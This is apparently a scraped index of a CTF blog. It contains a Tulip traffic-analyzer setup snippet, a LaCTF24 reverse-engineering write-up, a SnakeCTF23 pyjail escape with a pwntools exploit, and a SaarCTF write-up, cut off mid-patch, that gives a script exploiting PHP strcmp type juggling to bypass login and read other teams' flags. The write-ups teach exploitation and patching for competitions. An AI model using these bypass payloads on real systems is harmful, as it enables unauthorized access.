take-pcap.sh:\n#!/usr/bin/bash IP_VPS=10.32.55.2 # remember to change this while true do rsync -avz --remove-source-files /ready_pcaps/* root@$IP_VPS:CHANGE_ME_TRAFFIC_DIR_HOST sleep 10 # tweak this as you like done Now open a tmux and run this script, tulip will receive the pcaps.\nCHANGE_ME_TRAFFIC_DIR_HOST is the absolute path to the TRAFFIC_DIR_HOST value in the .env you wrote when configuring tulip.\n","permalink":"http://leo1.cc/posts/docs/tulip_setup/","summary":"Tulip is a traffic analyzer tool made for A/D CTFs, this post walks you throught all the important steps requied to deploy Tulip painlessly (hopefully).","title":"Tulip setup for A/D CTFs"},{"content":"Challenge description: # ./glottem flag? lactf{no_idea} incorrect\nThe challenge presents a flag checker script written in a mixture of JavaScript and Python. The objective is to reverse engineer the obfuscated code to understand its functionality and generate the correct flag that will pass the verification.\nSource code: glottem is the bash script that takes one single string as input to verify, locally, if it corresponds to the flag. The script contains all the code necessary to perform the check:\nThe script makes use of Here Documents https://en.wikipedia.org/wiki/Here_document to generate sections of a source code file that are treated as if they were a separate file. These temporary files are then executed on the fly. You can locate the start and the end of these streams by their delimiters: 1\u0026lt;\u0026lt;4201337 and 4201337 Users are prompted to input a flag via read -p \u0026quot;flag? \u0026quot; flag. The flag is than passed as parameter to a script executed by both a python and javascript interpreter. This part of the script contains the main verification logic and the code is structured to make it possible to be run by both interpreter. This has been acheived thanks to the clever positioning of the comment delimeters that prevent the javaScript interpreter from evaluating python code and vice versa. If both execution of the code return 1, the flag is correct and the script prints correct. #!/bin/sh 1\u0026lt;\u0026lt;4201337 1//1,\u0026#34;\u0026#34;\u0026#34; exit=process.exit;argv=process.argv.slice(1)/* 4201337 read -p \u0026#34;flag? \u0026#34; flag node $0 \u0026#34;$flag\u0026#34; \u0026amp;\u0026amp; python3 $0 \u0026#34;$flag\u0026#34; \u0026amp;\u0026amp; echo correct || echo incorrect 1\u0026lt;\u0026lt;4201337 *///\u0026#34;\u0026#34;\u0026#34;;from sys import argv e = [[[...],[...],...],...,[[...],[...],...]] alpha=\u0026#34;abcdefghijklmnopqrstuvwxyz_\u0026#34; d=0;s=argv[1];1//1;\u0026#34;\u0026#34;\u0026#34; /*\u0026#34;\u0026#34;\u0026#34; #*/for (let i = 0; i \u0026lt; s.length; i ++) {/* for i in range(6,len(s)-2): #*/d=(d*31+s.charCodeAt(i))%93097/* d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]#*/} exit(+(d!=260,[d!=61343])[0]) 4201337⏎ Reversing the algorithm Let\u0026rsquo;s focus on the second part of the script containing the js and python code.\nA 3-dimensional matrix e is created containing apparently random numbers the alphabet and the letters order is saved in alpha the user input is moved in the variable s and the variable d is set to zero. Then, what follows are two \u0026ldquo;nested\u0026rdquo; loops that modify the value of d based on the characters in s.\nBecause of the different intepreters, the 2 for loop are not really nested and their execution is copletely indipendent. Their execution takes place in 2 entirely different context with 2 different instances of d and s.\nIf we convert the Javascript part into equivalent Python code we get the following 2 distinct loops:\n# first loop converted from js to python for i in range(0, len(s)): d1=(d1*31+ord(s[i]))%93097 # second loop already in python for i in range(6,len(s)-2): d2+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]#*/} The first loop generates a hash based on the input string. It iterates through each character of the string using a for loop. For each character, its ascii value is obtained using the ord() function. This value is then added to the current value of the hash multiplied by 31. This step effectively accumulates the contribution of each character to the overall hash value. To prevent the hash value from growing excessively large and to maintain consistency in the range of hash values, a modulo operation is performed after each update. This operation ensures that the hash value remains within a predefined range, specified by the modulus 93097. The flag hash has to be equal to 61343.\nThe second loop iterates through a subset of characters in s starting from index 6 and ending two characters before the end of the string (skipping lactf{ and } ) . Within the loop, d is updated by accessing elements of e using indices derived from character pairs in s. The character at index i and its succeeding character at index i+1 are mapped to their positions in the alphabet using alpha.index() to determine the indices for accessing e. The retrieved values from e are then added to d, accumulating the contributions of the selected character pairs to the hash value. The algorithm concludes after iterating through the specified character range, resulting in the final hash value stored in d. Such value has to be equal to 260 in order for the flag to be valid.\nSolution: Understanding the 2 hash algorithms helps us find weak points that could lead us to quickly recover the flag.\nIn particular it is possible to notice that the array e exclusively contains numbers ranging from 10 to 17. Furthermore, considering that the second hash value must be 260 and the flag needs to be 26 characters long, it becomes apparent that the value 260 can be produced by the second loop only if each summed value is precisely equal to 10.\nThis reduces our pool of possible strings by a lot because now we know that each time we access e in the second loop the only right value to extract from the array and sum is 10.\nWe can now produce a solver based on a recursive function that produces all the possible flags that adhere to the conditions set by the second hash algorithms and the length of the flag in a feasible amount of time. Starting from each letter of the alphabet we can recursevly append a new letter only if that letter indexes a number equal to 10 in the array e. A new recursive branch is invoked for each letter that respect that rule.\nvalid_sequences = [] def recursive_solver(curr_letter, curr_index, sequence=[]): global valid_sequences # if we reached the 26th recursion depth level we have found a possible flag if curr_index == 26: valid_sequences = valid_sequences + [sequence+[curr_letter]] return # otherwise keep recursing for each letter that produces a 10 for guess in alpha: number = e[curr_index][alpha.index(curr_letter)][alpha.index(guess)] if number == 10: recursive_solver(guess, curr_index+1, sequence + [curr_letter]) alpha=\u0026#34;abcdefghijklmnopqrstuvwxyz_\u0026#34; for starting_letter in alpha: recursive_solver(starting_letter, 0) Obviously this is not enough, the hash 260 turns out to be compatible with a total of 42436 possible flags. To find the right one we can use the other hashing algorithm. We can test the original code against each one of our possible flag in a feasible amount of time. Hopefully only one of the them will produce a hash value that is equal to 61343.\nfor sequence in valid_sequences: sequence = \u0026#34;lactf{\u0026#34;+\u0026#39;\u0026#39;.join(sequence)+\u0026#34;}\u0026#34; d = 0 for i in range(0, len(sequence)): d=(d*31+ord(sequence[i]))%93097 if d == 61343: print(\u0026#34;lactf{\u0026#34; +sequence+ \u0026#34;}\u0026#34;) The output of the script is indeed a single string representing our flag.\nFlag: lactf{solve_one_get_two_deal} ","permalink":"http://leo1.cc/posts/writeups/lactf24-glottem/","summary":"This reverse-engineering challenge was part of LaCTF 2024. What we faced was a flag checker script written in both python and javascript. Sounds fun right?","title":"LaCTF24 - Glottem"},{"content":"Challenge description: I want to read an env variable, but I\u0026rsquo;m getting stressed out because of that\nblacklist!!! Would you help me plz? :(\nnc misc.snakectf.org 1700\nThe file attached to the challenge is called jail.py, so we deduce that this is a pyjail challenge, meaning that we have to find a way to exit a python sandbox and find the flag in the host file system.\nSource code: Jail.py implements a python class called “Jail”, this class implements 3 methods:\n__init__: this will initialize 4 attributes with empty strings (F, L, A and G,) and then call the run_code method with our input as a parameter. run_code: this is the function where all the magic happens: our input has to pass a blacklist-based filter to then be executed by an exec function, our goal is to create a payload that can pass the blacklist filter and print the flag using python code. Note that any attempt to use blacklisted strings or chars will result in an error message and the code not beeing executed. get_var: this functions takes a string as a parameter and prints the env variable with that name. #!/usr/bin/env python3 import os banner = r\u0026#34;\u0026#34;\u0026#34; _____ _ __ _ _ / ___| | / _| | | | | \\ `--.| |_ _ __ ___ ___ ___| |_ _ _| | _ __ ___ __ _ __| | ___ _ __ `--. \\ __| \u0026#39;__/ _ \\/ __/ __| _| | | | | | \u0026#39;__/ _ \\/ _` |/ _` |/ _ \\ \u0026#39;__| /\\__/ / |_| | | __/\\__ \\__ \\ | | |_| | | | | | __/ (_| | (_| | __/ | \\____/ \\__|_| \\___||___/___/_| \\__,_|_| |_| \\___|\\__,_|\\__,_|\\___|_| \u0026#34;\u0026#34;\u0026#34; class Jail(): def __init__(self) -\u0026gt; None: print(banner) print() print() print(\u0026#34;Will you be able to read the $FLAG?\u0026#34;) print(\u0026#34;\u0026gt; \u0026#34;,end=\u0026#34;\u0026#34;) self.F = \u0026#34;\u0026#34; self.L = \u0026#34;\u0026#34; self.A = \u0026#34;\u0026#34; self.G = \u0026#34;\u0026#34; self.run_code(input()) pass def run_code(self, code): badchars = [ \u0026#39;c\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;w\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;z\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;J\u0026#39;, \u0026#39;K\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;P\u0026#39;, \u0026#39;Q\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;S\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;@\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;^\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;~\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;] badwords = [\u0026#34;aiter\u0026#34;, \u0026#34;any\u0026#34;, \u0026#34;ascii\u0026#34;, \u0026#34;bin\u0026#34;, \u0026#34;bool\u0026#34;, \u0026#34;breakpoint\u0026#34;, \u0026#34;callable\u0026#34;, \u0026#34;chr\u0026#34;, \u0026#34;classmethod\u0026#34;, \u0026#34;compile\u0026#34;, \u0026#34;dict\u0026#34;, \u0026#34;enumerate\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;filter\u0026#34;, \u0026#34;getattr\u0026#34;, \u0026#34;globals\u0026#34;, \u0026#34;input\u0026#34;, \u0026#34;iter\u0026#34;, \u0026#34;next\u0026#34;, \u0026#34;locals\u0026#34;, \u0026#34;memoryview\u0026#34;, \u0026#34;next\u0026#34;, \u0026#34;object\u0026#34;, \u0026#34;open\u0026#34;, \u0026#34;print\u0026#34;, \u0026#34;setattr\u0026#34;, \u0026#34;staticmethod\u0026#34;, \u0026#34;vars\u0026#34;, \u0026#34;__import__\u0026#34;, \u0026#34;bytes\u0026#34;, \u0026#34;keys\u0026#34;, \u0026#34;str\u0026#34;, \u0026#34;join\u0026#34;, \u0026#34;__dict__\u0026#34;, \u0026#34;__dir__\u0026#34;, \u0026#34;__getstate__\u0026#34;, \u0026#34;upper\u0026#34;] if (code.isascii() and all([x not in code for x in badchars]) and all([x not in code for x in badwords])): exec(code) else: print(\u0026#34;Exploiting detected, plz halp :/\u0026#34;) def get_var(self, varname): print(os.getenv(varname)) if (__name__ == \u0026#34;__main__\u0026#34;): Jail() Solution: Obviously the attributes F, L, A and G are not there only because they are nice, but there must be a way to use those variable names as chars, considering also that these are blacklisted characters.\nSo our final goal must be to call the get_var function passing \u0026ldquo;FLAG\u0026rdquo; as a parameter, using the attributes called F, L, A, G.\nThe first step we took was to create a python script to iterate throught the various printable chars and print only the ones allowed by the blacklist:\nimport string badchars = [ \u0026#39;c\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;w\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;z\u0026#39; , \u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;J\u0026#39;, \u0026#39;K\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;N\u0026#39; , \u0026#39;O\u0026#39;, \u0026#39;P\u0026#39;, \u0026#39;Q\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;S\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;W\u0026#39; , \u0026#39;X\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;%\u0026#39; , \u0026#39;\u0026amp;\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;@\u0026#39; , \u0026#39;[\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;^\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;~\u0026#39; , \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;] allowed = [] for i in string.printable: if i not in badchars: allowed.append(i) print(allowed) and the result was:\n[\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;:\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\x0b\u0026#39;, \u0026#39;\\x0c\u0026#39;] We can see that with those chars we can compose different python keywords like self and get_var, which might be useful to print the flag. The only thing that we have to craft is the string “FLAG”, mainly because we are not allowed to use those letters (obviously) and we can\u0026rsquo;t use chars such as the backtick and the double qoutes.\n**How can we access the attributes inside __init__ and use their names as strings?\nThere is a python function called dir that lists all the methods, attributes and built-ins of an object. We can see that __dir__ is blacklisted, while dir is not , this is a good starting point.\n**Now, what object do we pass to this function?\nEasy, we pass self as a parameter, which is a keyword that is used to indicate the object itself inside the class.\nFrom now on, to debug the payload, we executed the pyjail locally with a small change inside it: we removed the string “print” from the blacklist (and the characters of which the string “print” is composed), this was obviously done for debugging purpuses. So now let’s try locally our payload:\nprint(dir(self)) the result was:\n[\u0026#39;A\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__weakref__\u0026#39;, \u0026#39;get_var\u0026#39;, \u0026#39;run_code\u0026#39;] That’s exactly what we wanted: it returns a list containing the names of every built-ins, methods and attributes of the object, including also the strings A, F, G and L.\nNow, thought, we have another problem:\n**how do we access these elements without using \u0026ldquo;bad characters\u0026rdquo;?\nLet\u0026rsquo;s take a deeper look throught the built-ins methods by running:\nprint(dir(dir(self)) the result was:\n[\u0026#39;__add__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__class_getitem__\u0026#39;, \u0026#39;__contains__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__delitem__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__getitem__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__iadd__\u0026#39;, \u0026#39;__imul__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__iter__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__len__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__mul__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__reversed__\u0026#39;, \u0026#39;__rmul__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__setitem__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;append\u0026#39;, \u0026#39;clear\u0026#39;, \u0026#39;copy\u0026#39;, \u0026#39;count\u0026#39;, \u0026#39;extend\u0026#39;, \u0026#39;index\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;pop\u0026#39;, \u0026#39;remove\u0026#39;, \u0026#39;reverse\u0026#39;, \u0026#39;sort\u0026#39;] The __getitem__ method might be interesting for us, because it takes an index as a parameter and returns the element that is at that index inside of a list.\nThat’s perfect, but now we have another problem: we are not able to use numeric characters inside of our payload, so how can we solve this problem?\nWe must first find a way to produce integer values as output, we may use a function that returns an integer and then use + or * to calculate the right index.\nBut we liked to think about it in an easier way: we know that conditional expressions return True or False, in short: 1 or 0, so we could sum the result of conditional expression in order to create the right index.\nBut, again, we have something that blocks us: \u0026gt;, \u0026lt; and = are blacklisted, but these operators are not the only available, we can still use the is keyword (it checks if 2 objects are the same object).\nTo create 1s and 0s we decided to use these expressions:\nself is self -\u0026gt; True -\u0026gt; 1 self is dir(self) -\u0026gt; False -\u0026gt; 0 **Now we have everything we need to write our payload and obtain the flag.\nWe can divide the payload in 4 parts, each part will return a character we need to compose the string \u0026ldquo;FLAG\u0026rdquo;:\n‘F’ is at index 1: dir(self).__getitem__(self is self) ‘L’ is at index 3: dir(self).__getitem__((self is self)+(self is self)+(self is self)) ‘A’ is at index 0: dir(self).__getitem__(self is dir(self)) ‘G’ is at index 2: dir(self).__getitem__((self is self)+(self is self)) Now we can concatenate these chars to create our final payload:\nself.get_var(dir(self).__getitem__(self is self) + dir(self).__getitem__((self is self) +\t(self is self) + (self is self)) + dir(self).__getitem__(self is dir(self)) + dir(self).__getitem__((self is self) + (self is self))) Final Exploit: from pwn import * r = remote(\u0026#34;misc.snakectf.org\u0026#34;, 1700) F = \u0026#34;dir(self).__getitem__(self is self)\u0026#34; L = \u0026#34;dir(self).__getitem__((self is self) + (self is self) + (self is self))\u0026#34; A = \u0026#34;dir(self).__getitem__(self is dir(self))\u0026#34; G = \u0026#34;dir(self).__getitem__((self is self) + (self is self))\u0026#34; payload = f\u0026#34;self.get_var({F}+{L}+{A}+{G})\u0026#34;.encode() r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, payload) print(r.recvline().strip()) r.close() Flag: snakeCTF{7h3_574r_d1d_7h3_j0b} ","permalink":"http://leo1.cc/posts/writeups/snakectf23-stressful_reader/","summary":"Pyjail challenge from SnakeCTF 2023.","title":"SnakeCTF23 - Stressful Reader"},{"content":"Service description Pasteable is a website, written in PHP, which allows a user to register, login and then create some \u0026ldquo;pastes\u0026rdquo; inside a Mysql database. This pastes get encrypted by the backend with a key provided by the user. The last feature of this website allows users to view the stored pastes and decrypt them with the appropriate keys.\nWhat\u0026rsquo;s our goal? The attack.json file provided by the SaarCTF organizers contained a list of usernames for this challenge, so we are probably supposed to login as that user and read the flag from the pastes list. Once this was clear we started to check how the login was handled: a user is logged in when authenticated is set to yes inside the $_SESSION array. So our goal is to set $_SESSION[\u0026quot;authenticated\u0026quot;] to yes.\n// forward the good bois if(isset($_SESSION[\u0026#34;authenticated\u0026#34;]) \u0026amp;\u0026amp; $_SESSION[\u0026#34;authenticated\u0026#34;] === \u0026#34;yes\u0026#34;) { header(\u0026#39;Location: /admin/home\u0026#39;); exit(); } How can we log in? Analysing the source code we can see that there are 2 places where the backend does what we want: in /func/register.php and in /func/login.php. We can see that the first file can’t do anything for us, because it only allows to set “authenticated” to “yes” for a newly created user. The second one, tho, allows us to login with any username, so let’s take a look on how this works.\n\u0026lt;?php session_start(); require(\u0026#34;config.php\u0026#34;); // include challenge functions include(\u0026#39;./lib/challenge.php\u0026#39;); if(!isset($_POST[\u0026#39;username\u0026#39;]) || !isset($_POST[\u0026#39;solution\u0026#39;])){ header(\u0026#39;HTTP/1.0 403 Forbidden\u0026#39;); die(\u0026#34;Invalid request\u0026#34;); } if(!isset($_SESSION[\u0026#39;challenge\u0026#39;]) || !(strcmp($_POST[\u0026#39;solution\u0026#39;], $_SESSION[\u0026#39;challenge\u0026#39;]) == 0)){ header(\u0026#39;HTTP/1.0 403 Forbidden\u0026#39;); die(\u0026#34;No valid challenge found\u0026#34;); } destroyChallenge(); $username = $_POST[\u0026#39;username\u0026#39;]; $stmt = $MYSQLI-\u0026gt;prepare(\u0026#34;SELECT user_id FROM user_accounts WHERE user_name = ? LIMIT 1\u0026#34;); if ( $stmt \u0026amp;\u0026amp; $stmt -\u0026gt; bind_param(\u0026#39;s\u0026#39;, $username) \u0026amp;\u0026amp; $stmt -\u0026gt; execute() \u0026amp;\u0026amp; $stmt -\u0026gt; store_result() \u0026amp;\u0026amp; $stmt -\u0026gt; bind_result($userid) \u0026amp;\u0026amp; $stmt -\u0026gt; fetch() ) { // user exists $_SESSION[\u0026#39;last_login\u0026#39;] = date(\u0026#34;Y-m-d H:i:s\u0026#34;, time()); $_SESSION[\u0026#39;id\u0026#39;] = $userid; $_SESSION[\u0026#39;name\u0026#39;] = $username; // set new state $_SESSION[\u0026#39;authenticated\u0026#39;] = \u0026#34;yes\u0026#34;; } else { // wrong data! $_SESSION[\u0026#39;last_login\u0026#39;] = date(\u0026#34;Y-m-d H:i:s\u0026#34;, time()); header(\u0026#39;HTTP/1.0 403 Forbidden\u0026#39;); } We can see that authenticated is set to yes only if the SQL query made previously is successful. What does that query do? It selects the user_id of the user with the username that we send to the page when we make the request. Our goal is for that query to be executed with our username, the problem is that are 2 if statements that prevent us from doing so:\nthe first checks if we sent both \u0026quot;username\u0026quot; and \u0026quot;solution\u0026quot; fields in our http request, and if not it gives us a 403 invalid request error. then the second checks if \u0026quot;challenge\u0026quot; is set inside the $_SESSION array and checks if the solution we sent is equal to what is inside $_SESSION at the index \u0026quot;challenge\u0026quot;, if one of those conditions is false it gives us a 403 No valid challenge founderror. But what are those \u0026quot;challenge\u0026quot; and \u0026quot;solution\u0026quot;? We can see that the page includes the following file: /lib/challenge.php. This file has 2 functions:\n\u0026lt;?php /** * Generates a new challenge * * @return string */ function generateChallenge() { mt_srand(time()); $strength = 6; $alpha = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $l = strlen($alpha); $random_string = \u0026#39;\u0026#39;; for($i = 0; $i \u0026lt; $strength; $i++) { $random_character = $alpha[mt_rand(0, $l - 1)]; $random_string .= $random_character; } $_SESSION[\u0026#39;challenge\u0026#39;] = $random_string; return $random_string; } /** * Destroys challenge */ function destroyChallenge() { unset($_SESSION[\u0026#39;challenge\u0026#39;]); } The first one creates a \u0026quot;challenge\u0026quot;, which is set inside the $_SESSION array as a string of 6 random chars taken from the following alphabet “ABCDEFGHIJKLMNOPQRSTUVWXYZ”, and the second one destroys it. We can see that the first function is getting called inside /func/challenge.php file and the second one inside /func/login.php file. So basically we have to send a POST request to /func/challenge.php (with the username as a parameter) in order to set inside the $_SESSION array the \u0026quot;challenge\u0026quot;. After that, we have to send another POST request to login.php with two parameters: “username” and “solution”, where “solution”must be equal to the challenge that was generated before. The brute-force approach is not the best solution because having an alphabet of 26 chars, and a string of 6 chars, we would have to try 308.915.776 times to be sure to find the correct \u0026quot;challenge\u0026quot;, this is obviously impractical, so we must find another approach.\nstrcmp() vuln and type juggling In the login.php page we analysed almost everything, the only thing remaining is the strcmp() function, just by googling and opening the PHP documentation, we can read this:\nIf you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable. For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.\nSo basically we can make this function return NULL thanks to PHP comparison problems with “==”. NULL is equal to 0: this vuln is called type juggling.\nBut how can we make it return NULL? Reading the documentation we find out that if a parameter is an array strcmp returns NULL.\nstrcmp(\u0026quot;foo\u0026quot;, array()) =\u0026gt; NULL + PHP Warning strcmp(\u0026quot;foo\u0026quot;, new stdClass) =\u0026gt; NULL + PHP Warning strcmp(function(){}, \u0026quot;\u0026quot;) =\u0026gt; NULL + PHP Warning\nIn conclusion our attack is composed like this:\nPOST request to /func/challenge.php with one parameter: \u0026quot;username\u0026quot;, this sets the \u0026quot;challenge\u0026quot; inside the $_SESSION array. POST request to /func/login.php with two parameters: \u0026quot;username\u0026quot; and the \u0026quot;solution\u0026quot; (array), setting \u0026quot;authenticated\u0026quot; inside the $_SESSION array. GET request to /admin/home/index.php in order to print the paste with the flag. Exploit: Our exploit takes a command line argument: the IP of an enemy team, and takes from the attack.json file the username that it will use to log in.\n#!/usr/bin/env python3 import random import string import sys import requests import json from pwn import * from Crypto.Hash import SHA256 import sys def get_flag_ids(team_id, service_name): url = \u0026#34;https://scoreboard.ctf.saarland/attack.json\u0026#34; try: response = requests.get(url) response.raise_for_status() data = response.json() if \u0026#34;flag_ids\u0026#34; in data and service_name in data[\u0026#34;flag_ids\u0026#34;]: if team_id in [team[\u0026#34;id\u0026#34;] for team in data[\u0026#34;teams\u0026#34;]]: for team in data[\u0026#34;teams\u0026#34;]: if team[\u0026#34;id\u0026#34;] == team_id: team_ip = next(team[\u0026#34;ip\u0026#34;]) return data[\u0026#34;flag_ids\u0026#34;][service_name].get(team_ip, {}) else: print(\u0026#34;Invalid team_id or service_name\u0026#34;) except requests.exceptions.RequestException as e: print(f\u0026#34;Error: {e}\u0026#34;) def get_data(team_id, service_name, flag_id): url = \u0026#34;https://scoreboard.ctf.saarland/attack.json\u0026#34; try: response = requests.get(url) response.raise_for_status() data = response.json() for team in data[\u0026#34;teams\u0026#34;]: if team[\u0026#34;id\u0026#34;] == team_id: team_ip = next(team[\u0026#34;ip\u0026#34;]) return data[\u0026#34;flag_ids\u0026#34;][service_name][team_ip][flag_id] except requests.exceptions.RequestException as e: print(f\u0026#34;Error: {e}\u0026#34;) host = sys.argv[1] team = (int(host.split(\u0026#34;.\u0026#34;)[1])-32)*200 + int(host.split(\u0026#34;.\u0026#34;)[2]) print(\u0026#34;I need to attack the team {} with host: {}\u0026#34;.format(team,host)) service = \u0026#39;Pasteable\u0026#39; for id in get_flag_ids(team,service): username = get_data(team, service, id) s = requests.Session() res = s.post(f\u0026#34;http://{host}:8080/func/challenge.php\u0026#34;, data={\u0026#34;username\u0026#34;:username}) res = s.post(f\u0026#34;http://{host}:8080/func/login.php\u0026#34;, data={\u0026#34;username\u0026#34;:username, \u0026#34;solution[]\u0026#34;:b\u0026#34;\u0026#34;}) res = s.get(f\u0026#34;http://{host}:8080/admin/\u0026#34;) print(res.text, flush=True) Patch To patch this vuln we have 2 options:\nCheck the type of the “solution” parameter and allow only string values. Check the \u0026quot;solution\u0026quot; parameter in another way, instead of using the strcmp() function. We decided to patch the service using the first option, and used the gettype() function to verify if \u0026quot;solution\u0026quot; was indeed a string.\nif( !isset($_POST[\u0026#39;username\u0026#39;]) || 